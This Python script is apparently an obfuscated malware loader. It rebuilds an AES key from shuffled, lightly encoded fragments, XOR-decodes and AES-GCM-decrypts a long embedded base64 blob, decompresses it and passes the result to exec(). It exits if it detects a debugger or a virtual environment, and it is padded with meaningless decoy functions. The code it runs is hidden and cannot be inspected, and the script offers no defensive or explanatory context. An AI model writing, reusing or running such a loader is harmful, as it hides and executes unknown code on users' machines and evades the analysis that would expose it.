
import sys, base64, zlib, os
from Crypto.Cipher import AES

def fake1(x): return x[::-1]
def unfake1(x): return x[::-1]
def fake2(x): return ''.join(chr(ord(c) ^ 0x5A) for c in x)
def unfake2(x): return ''.join(chr(ord(c) ^ 0x5A) for c in x)
def fake3(x): return ''.join(chr((ord(c)+7)%256) for c in x)
def unfake3(x): return ''.join(chr((ord(c)-7)%256) for c in x)
def fake4(x): return ''.join(chr((ord(c)-7)%256) for c in x)
def unfake4(x): return ''.join(chr((ord(c)+7)%256) for c in x)
def fake5(x): return x.swapcase()
def unfake5(x): return x.swapcase()
fake_funcs = [fake1, fake2, fake3, fake4, fake5]
unfake_funcs = [unfake1, unfake2, unfake3, unfake4, unfake5]

def xor_decrypt(data: bytes, key: bytes):
    return bytes([b ^ key[i % len(key)] for i, b in enumerate(data)])

def reconstruct_key(parts, indices, types):
    ordered = [None]*len(parts)
    for i, idx in enumerate(indices):
        part = parts[i][2:-2]
        func = unfake_funcs[types[i]]
        part = func(part)
        ordered[idx] = part
    key_b64 = ''.join(ordered)
    missing = len(key_b64) % 4
    if missing: key_b64 += "=" * (4-missing)
    return base64.b64decode(key_b64)

# دوال وهمية عشوائية
def TjPQdTnDhF(): return 99
def WuvtJ8Z1Zr(): return 19
def T8D9yGqRGS(): return 52
def OWbQWlzTuF(): return 63
def Xlf8LM8m8Q(): return 5
def rtBd6ByItA(): return 5
def XOKz2za6Q3(): return 65
def xr3GvytOHm(): return 15
def bDdRlY1Xrq(): return 37
def smr7jxF4ow(): return 17
def rZpKRTBAWg(): return 35
def kFuItVM03r(): return 68

parts = ['EU/jsf8zXF', 'ttEb8JGche', 'UyIQXrO2GW', 'RhO=AS', 'V84,2\x17,,IC', 'LNZPsL78zZ', 'tlIs68aJsW', 'e5a8yGmEtc']
indices = [0, 6, 3, 7, 5, 4, 2, 1]
types = [4, 0, 4, 4, 1, 0, 4, 0]

nonce = base64.b64decode("nPh1Yjzm+Dbcs0Aw")
tag = base64.b64decode("Z8xPYcI7ok/zu9/2a4EfPA==")
ciphertext_b64 = "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"
xorkey_b64 = "oRsarlrfDQcgvgOCQq+zbg=="

if any(x in os.environ for x in ["PYCHARM_HOSTED", "VIRTUAL_ENV"]) or "PYDEV_DEBUGGER" in sys.modules:
    print("Debugging/VM Detected! Exiting.")
    sys.exit(1)

try:
    key = reconstruct_key(parts, indices, types)
    xorkey = base64.b64decode(xorkey_b64)
    data = base64.b64decode(ciphertext_b64)
    data = xor_decrypt(data, xorkey)
    cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
    dec = cipher.decrypt_and_verify(data, tag)
    exec(zlib.decompress(dec).decode('utf-8'))
except Exception as e:
    print("\n[!] Error during decryption or execution:", e)
    sys.exit(1)
